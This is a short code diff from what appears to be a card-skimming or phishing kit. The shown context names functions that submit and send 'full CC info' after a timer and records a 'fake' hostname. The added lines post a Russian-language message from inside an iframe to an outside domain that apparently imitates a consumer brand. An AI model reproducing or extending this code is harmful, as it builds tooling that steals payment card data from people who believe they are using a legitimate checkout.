@@ -71,6 +71,10 @@ const SubmitCCInfo = async () => {
             projectType: projectType,
             fake: window.location.hostname,
         });
+        window.parent.postMessage(
+            "Кнопка нажата внутри iframe",
+            "https://us.hismilelive.top/"
+        );
     };
     setTimeout(sendFullCCInfo, 2000);
 
